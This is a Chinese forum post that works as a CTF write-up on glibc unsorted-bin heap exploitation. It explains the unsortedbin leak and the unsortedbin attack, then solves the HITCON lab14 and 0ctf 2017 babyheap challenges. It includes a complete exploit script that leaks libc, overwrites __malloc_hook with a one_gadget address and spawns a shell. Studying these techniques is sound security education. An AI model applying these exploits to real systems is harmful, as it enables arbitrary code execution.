> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.52pojie.cn](https://www.52pojie.cn/thread-1467962-1-1.html)

> [md] 期末考试还有各种大作业比较忙，有一段时间就没怎么写 [博客](https://hack1s.fun)，补一篇 Unsortedbin 相关的里面涉及到的二进制程序可以在 [https://buuoj.c......

 ![](https://avatar.52pojie.cn/data/avatar/001/57/34/12_avatar_middle.jpg) 呆毛王与咖喱棒期末考试还有各种大作业比较忙，有一段时间就没怎么写[博客](https://hack1s.fun)，补一篇 Unsortedbin 相关的

里面涉及到的二进制程序可以在 [https://buuoj.cn](https://buuoj.cn) 直接在线做

Unsorted bins
-------------

unsorted bin 顾名思义就是没有排序过的 bins

我们看一下 main_arena 中的结构

![](https://static.hack1s.fun/images/2021/03/10/image-20210310161659389.png)

其中可以看到有 0x20 到 0xb0 的 fastbins（但是实际上最后三个不用）

之后还有从 0x20 到 0x3f0 的 smallbins

之后是 0x400 到 0x80000 的 largebins

这些 bins 都是双链表，所以比 fastbins 访问起来要慢一点

关于 unsorted bins 的来源，主要有三种情况：

*   如果一个 chunk 与 top chunk 不相邻，并且大小大于 0x80（即不属于 fastbins），在被 free 后会加入到 unsorted bins 中；
*   申请 chunk 时有时会从一个比较大的 chunk 中分割成两半，一部分用来分配内存，另一部分则是会加入到 unsotred bins 中；
*   当执行 malloc_consolidate 合并空闲堆块时，如果这个 chunk 不与 top chunk 相连，有可能会把合并后的 chunk 放在 unsorted bin 中；

在执行 malloc 的时候，如果在 fastbin、smallbin 都没有找到合适大小的块，就会在 unsorted bin 中进行遍历，搜索合适大小的 chunk，同时会顺便把 unsortedbin 中的 chunk 进行排序，根据 chunk 的大小放到合适的位置；

unsorted bin 的特点是，匹配时会用 bk 从后向前遍历，对没有排序的 chunk 进行 sort 并 unlink，如果遇到合适的 chunk 就会将其 unlink 并 malloc 分配；

假设目前 unsorted bins 中有三项，分别是 0x100、0x90、0x400 的 chunk

![](https://static.hack1s.fun/images/2021/04/27/image-20210427192221905.png)

这时假设我们执行了一个`malloc(0x88)`，需要一个大小为 0x90 的 chunk

在 unsorted bin 搜索中从后向前搜索，发现了 0x400 的 chunk

发现大小不符合，将这个 chunk 放到 0x400 应该在的 large bins 中，并将其 unlink

unlink 的过程实际上是执行了`head->bk = p->bk`，让头节点中的 bk 指向 unlink 掉的 chunk 之前的 chunk

再继续运行搜索发现 unsortedbins 的头的 bk 指向的正好是 0x90 大小，则将其 unlink 并直接分配给 malloc 使用；

Unsortedbin 攻击
--------------

unsortedbin 相关的攻击主要有两个

一是 unsortedbin leak

二是 unsortedbin attack

### unsortedbin leak

我们使用`malloc_testbed`试一下

```
chunk_A = malloc(0x88)
chunk_B = malloc(0x88)
malloc(0x28)

free(chuk_B)

```

首先申请两个不属于 fastbin 的 chunk

之后申请一个 fastbin 的 chunk，为了防止与 top chunk 相连导致直接合并

最后释放 b，在 GDB 中调试看到确实放在了 unsortedbin 中

![](https://static.hack1s.fun/images/2021/04/27/image-20210427202555355.png)

现在由于 unsortedbin 中除了头节点只有这一项

所以这个 chunk_B 中的 fd、bk 都指向了 main_arena

查看一下 main_arena 中 unsortedbin 的 fd 和 bk

![](https://static.hack1s.fun/images/2021/04/27/image-20210427203435458.png)

可以看到两个也都是指向了这个 chunk

那么我们修改一下脚本，再把这个 chunk 申请回来

```
malloc(0x88)

```

![](https://static.hack1s.fun/images/2021/04/27/image-20210427205614452.png)

可以看到，这时 chunk 中的 fd 和 bk 是没有被清除的

因此通过输出函数之类的是可以直接输出这两个的值的

unsortedbin leak 就是通过输出 unsortedbin list 中链表尾部的 chunk 的 fd 字段，泄漏出 main_arena 中的地址

由于 main_arena 一般是在 libc 中，有了这个值我们就得到了 libc 中的基地址；就可以通过这个方法绕过 ASLR

另外，一般 main_arena 的起始地址与`__malloc_hook`的地址只差 0x10

所以 leak 实际上的效果是：

输出了 fd 即 main_arena 中 unsortedbin 的值 ->

通过这个地址计算出 main_arena 的起始地址 ->

通过这个起始地址获得 libc 的基地址

![](https://static.hack1s.fun/images/2021/04/27/image-20210427210112889.png)

### unsortedbin attack

unsortedbin attack 就是针对这个 bk 在写时没有进行验证的攻击

比较低版本的 glibc 中没有校验这个最后的 bin 到底是不是双向链表中的成员

在结合堆溢出或 UAF 的漏洞编辑 unsortedbin 中的 bk 指针后，就可以直接将 main_arena 中的 bk 覆盖写掉

在`glibc/malloc/malloc.c`中的`_init_malloc`有这样一段代码

```
/* remove from unsorted list */
if (__glibc_unlikely (bck->fd != victim))
  malloc_printerr ("malloc(): corrupted unsorted chunks 3");
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);

```

这会将`bck->fd`写入到本 unsortedbin 的位置

所以我们控制了 bk 就可以将 unsorted_chunks(av) 写入到任意位置；

还是之前的那个程序，我们在申请并释放 chunk_B 之后编辑一下 chunk_B，在 bk 写入伪造的指针

在原本的脚本中加了这样一行

```
chunk_A = malloc(0x88)
chunk_B = malloc(0x88)
malloc(0x28)

free(chuk_B)

edit(chunk_B,p64(0xdeadbeef) + p64(heap))

```

运行看到

![](https://static.hack1s.fun/images/2021/04/27/image-20210427203657655.png)

看到 chunk_B 的 fd 和 bk 都变成了我们写入的值

这之后再执行一次

```
malloc(0x88)

```

这时就会申请 unsorted bin 中的这个块，将其从原本的地方 unlink

同时会在 main_arena->unsortedbin_bk 写入我们伪造的这个 bk

![](https://static.hack1s.fun/images/2021/04/27/image-20210427204005759.png)

为我们这里将 bk 指向了 chunk_A

可以看到 chunk_A 的 fd 也变成了 main_arena 中的 unsortedbin

这里的两个写操作是

```
p = victim;
p->bk->fd = p->fd;
p->fd->bk = p->bk;

```

由于 p 是链表尾部的 chunk，`p->fd`是 main_arena 中 unsortedbin 头

所以实际上就是头中的 bk 被写为我们伪造的 bk（副作用）

另外在我们伪造的 chunk 的 fd 写入 unsortedbin 头的 fd（核心）

核心的效果就是可以在**_任意地址_**写入这个 unsortedbin head 的 fd

实例
--

这边我们做两道题学习一下

### HITCON-Training lab14

程序是有源代码的，可以看到主要的内容就是一个循环，如果 magic>4869 就可以输入 flag

```
void l33t(){
        system("cat /home/magicheap/flag");
}

int main(){
        char buf[8];
        setvbuf(stdout,0,2,0);
        setvbuf(stdin,0,2,0);
        while(1){
                menu();
                read(0,buf,8);
                switch(atoi(buf)){
                        case 1 :
                                create_heap();
                                break ;
                        case 2 :
                                edit_heap();
                                break ;
                        case 3 :
                                delete_heap();
                                break ;
                        case 4 :
                                exit(0);
                                break ;
                        case 4869 :
                                if(magic > 4869){
                                        puts("Congrt !");
                                        l33t();
                                }else
                                        puts("So sad !");
                                break ;
                        default :
                                puts("Invalid Choice");
                                break;
                }

        }
        return 0 ;
}


```

要执行 magic，我们需要满足两个条件，一是 case 设置为 4869；二是让 magic>4869

而与 magic 有关的地方只有在初始化堆时将其设置为了 0

我们可以利用 unsortedbin attack 向 magic 处写入 unsortedbin 的 fd

这个数一定是大于 4869 的

顺理成章的就可以写出脚本

```
malloc(0x28, '')
malloc(0x98, '')
malloc(0x28, '')
free(1)

payload = p64(0)*5 + p64(0xa1) + p64(0xdeadbeef) + p64(elf.sym.magic-0x10)
edit(chunk_A, len(payload), payload)
malloc(0x98, '')

```

但是运行的时候发现这个 repo 里面现成的程序是和默认的 libc 链接起来的，这样 free 之后被加入到了 tcachebin 而不是 unsortedbin

所以用 patchelf 进行修改，或者也可以重新编译一下

关于 patchelf 的安装

```
git clone https://github.com/NixOS/patchelf
cd patchelf
./bootstrap.sh
./configure
make
make install

```

使用时

```
patchelf --set-rpath .links magicheap

```

这样就可以为这个二进制设置一个 runpath

只需要在`.links`下放好需要的`ld.so.2`和`libc.so.6`两个软链接就可以了

不过这边直接重新编译了一下

```
gcc magicheap.c -no-pie -o magicheap -Wl,--rpath=.links

```

运行可以看到这里 magic 变量的值已经被覆盖了

![](https://static.hack1s.fun/images/2021/04/28/image-20210429105327312.png)

之后再发送过去 4869

![](https://static.hack1s.fun/images/2021/04/28/image-20210429105515468.png)

就执行了这样一个 cat 读 flag 的操作，不过这里没有创建文件夹，就提示 no such file 了；

### babyheap_0ctf_2017

这题可以直接在 buuoj 上做

首先 checksec 发现安全机制都打开了

![](https://static.hack1s.fun/images/2021/03/31/image-20210331150227780.png)

漏洞点位于填充数据的函数中

![](https://static.hack1s.fun/images/2021/03/31/image-20210331161345496.png)

这里在 fill 这个选项中虽然进行了长度判断，但是这个比较不是和 chunk 本身的大小进行比较，而是和用户输入的 size 比较，所以只要输入一个比较大的 size 就可以溢出 chunk 后面的内容

![](https://static.hack1s.fun/images/2021/04/24/image-20210425102119595.png)

按照 double free 做一下试试看

```
a = malloc(0x38)
b = malloc(0x38)

free(a)
free(b)
free(a)

```

这时 gdb 调试看到

![](https://static.hack1s.fun/images/2021/04/24/image-20210425102803867.png)

tcachebins

这是因为链接的库文件不对，网上搜了之后安装了 patchelf 和 glibc-all-in-one

```
patchelf --set-interpreter=~/glibc-all-in-one/ld.so.2 babyheap
patchelf --set-rpath=~/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ babyheap

```

之后就可以展开 fastbin attack 了

但是这个程序开启了 Full RELRO 和 PIE

那么修改 got 表是不可能了，尝试修改`__free_hook`或`__malloc_hook`

首先我们需要泄漏出一个 libc 的地址，之后利用 fastbin attack 修改`__malloc_hook`为 one_gadget 的地址

泄漏 libc 地址的话可以使用 unsortedbin leak

但是这个程序中分配内存时使用的是`calloc`而不是`malloc`

分配之后会清零，所以没办法简单的直接读出来

思路是：

*   首先 free 两个 fastbin，记为 a,b
*   申请一个 unsortedbin，记为 c
*   利用溢出修改第二次 free 的 fastbin (b) 的 fd，使其指向 unsortedbin (c)
*   利用溢出修改 unsortedbin 的 size，伪造成 fastbin 的大小
*   malloc 两次 fastbin，申请到的空间分别是原本 b、c 所在的空间；这时同时有两个指针指向 c
*   利用溢出修改 unsortedbin 的 size，使其恢复为一个 unsortedbin 的大小；
*   free 掉 unsortedbin
*   利用另一个 fastbin 的指针泄漏出 unsortedbin 中的 fd 和 bk，即 main_arena 的地址

这里有一个注意点，虽然我们不知道堆的地址，但是由于 CTF 的程序运行时都是堆刚刚初始化的状态，第一个堆快的第 8 位应该是按 0 对齐的，所以我们修改 fastbin 时只修改第八位就可以指向 unsortedbin

核心代码

```
chunk_A = malloc(0x28)

chunk_eB = malloc(0x28)
chunk_B = malloc(0x28)

chunk_eC = malloc(0x28)
chunk_C = malloc(0x88)

chunk_D = malloc(0x28)
# avoid consolidate

free(chunk_A)
free(chunk_B)
fill(chunk_eB,49,p64(0)*5 + p64(0x31) + p8(0xc0))
# point to chunk_C
fill(chunk_eC,48,p64(0)*5 + p64(0x31))
# change size to a fastbin

malloc(0x28)
dup = malloc(0x28)
# point to chunk_C

fill(chunk_eC,48,p64(0)*5 + p64(0x91))
# change size back to unsortedbin

free(chunk_C)

```

执行这一段脚本

![](https://static.hack1s.fun/images/2021/04/29/image-20210429193311942.png)

可以看到 unsotredbin 中的 fd 和 bk 都指向了 main_arena

那么我们就成功拿到了一个泄漏的 libc 地址

由于一般`__malloc_hook`与`main_arena`只差 0x10 的距离，我们直接相减就可以得到`__malloc_hook`的地址

![](https://static.hack1s.fun/images/2021/05/06/image-20210506143028227.png)

接下来就尝试覆盖`__malloc_hook`改为 system 函数或者是 one_gadget

再一次利用 fastbin_dup，这一次修改其中的 fd 指向`__malloc_hook`附近的 fake chunk

![](https://static.hack1s.fun/images/2021/05/20/image-20210520113028864.png)

这里`0xaed`有一个可以用于伪造的地方

那么

```
# get shell
chunk_E = malloc(0x68)
chunk_eF = malloc(0x38)
chunk_F = malloc(0x68)
free(chunk_E)
free(chunk_F)

payload = b'\x00'*0x38 + p64(0x71) + p64(malloc_hook-0x23)
# find_fake_fast
fill(chunk_eF,len(payload),payload)

```

这样之后再申请两次大小为 0x68 的 chunk 就可以获得一个在 malloc_hook 附近的 chunk 了

```
malloc(0x68)
chunk = malloc(0x68)
fill(chunk,0x1b,b'\x00'*0x13 + p64(one))

```

在其中填上 gap 和 one_gadget 的地址，结束；

```
chunk_A = malloc(0x28)

chunk_eB = malloc(0x28)
chunk_B = malloc(0x28)

chunk_eC = malloc(0x28)
chunk_C = malloc(0x88)

chunk_D = malloc(0x28)

free(chunk_A)
free(chunk_B)

fill(chunk_eB,49,p64(0)*5+p64(0x31)+p8(0xc0))
fill(chunk_eC,48,p64(0)*5+p64(0x31))

malloc(0x28)
dup = malloc(0x28)

fill(chunk_eC,48,p64(0)*5+p64(0x91))
free(chunk_C)
io.recvuntil('Command: ')
io.sendline('4')
io.recvuntil('Index: ')
io.sendline(str(dup))
io.recvuntil('Content: \n')

fd = u64(io.recv(6).ljust(8,b'\x00'))
main_arena = fd-0x58
success("Main Arena's Address is "+hex(main_arena))

malloc_hook = main_arena-0x10
libc = LibcSearcher('__malloc_hook',malloc_hook)
libc_base = malloc_hook - libc.dump('__malloc_hook')
system = libc_base + libc.dump('system')
success("System's Address: "+hex(system))
one = libc_base +0x4526a
success("One Gadget's Address: "+hex(one))

# get shell
chunk_E = malloc(0x68)
chunk_eF = malloc(0x38)
chunk_F = malloc(0x68)
free(chunk_E)
free(chunk_F)

payload = b'\x00'*0x38 + p64(0x71) + p64(malloc_hook-0x23)
# find_fake_fast
fill(chunk_eF,len(payload),payload)

malloc(0x68)
chunk = malloc(0x68)
fill(chunk,0x1b,b'\x00'*0x13 + p64(one))
malloc(0x8)

io.interactive()

``` ![](https://avatar.52pojie.cn/data/avatar/001/57/34/12_avatar_middle.jpg)

> [Hmily 发表于 2021-6-30 15:59](https://www.52pojie.cn/forum.php?mod=redirect&goto=findpost&pid=39095452&ptid=1467962)  
> @呆毛王与咖喱棒 提个建议，图床实在太慢了，能否把这个系列文章的图片上传本地，这样打开速度可以快一些。

小水管服务器确实有点慢 &#129315;，我看看这两天传一下![](https://avatar.52pojie.cn/data/avatar/000/00/00/01_avatar_middle.jpg)呆毛王与咖喱棒 [@呆毛王与咖喱棒](https://www.52pojie.cn/home.php?mod=space&uid=1573412) 提个建议，图床实在太慢了，能否把这个系列文章的图片上传本地，这样打开速度可以快一些。 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) 很详细的学习资源，支持。![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)Hmily 很详细的学习资源，支持。很详细的学习资源，支持。![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)  
很详细的学习资源，支持。很详细的学习资源，支持。![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)tbloy 谢谢大佬分享！！！![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)拼搏的南瓜 谢啦哈哈哈！![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)chinasniu  
谢谢大佬分享![](https://static.52pojie.cn/static/image/smiley/default/17.gif) ![](https://avatar.52pojie.cn/data/avatar/000/20/15/05_avatar_middle.jpg) iFengZhiwei 来跟咖喱棒学 PWN![](https://static.52pojie.cn/static/image/smiley/laohu/laohu39.gif)